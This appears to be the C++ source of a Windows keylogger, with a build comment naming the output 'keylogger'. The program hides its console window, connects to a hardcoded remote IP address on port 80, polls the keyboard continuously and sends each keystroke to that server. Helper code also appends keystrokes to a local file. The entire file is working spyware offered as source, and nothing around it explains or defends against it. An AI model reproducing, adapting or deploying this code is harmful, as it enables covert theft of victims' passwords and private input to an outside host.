/** 
g++ Source.cpp simple-client -o keylogger -lwsock32 -lWs2_32 
g++ simple-client.cpp -c -o simple-client

*/


#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

#include "simple-client.h"

using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		LOG("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		LOG("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		LOG("#ALT");
		return true;
	default: 
		return false;
	}
}



int main()
{
	FreeConsole();

	char KEY = 'x';
	
	
	SimpleClient cl { "151.52.245.137", "80" };
	
	while (!cl.connect()) {
		cout << "Connection failed, retrying" << endl;
		Sleep(500);
	}
		
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{	
			if (GetAsyncKeyState(KEY) & 0x01)
				cl.send((const char*)&KEY, 4);
		}
	}
	
	

	return 0;
}

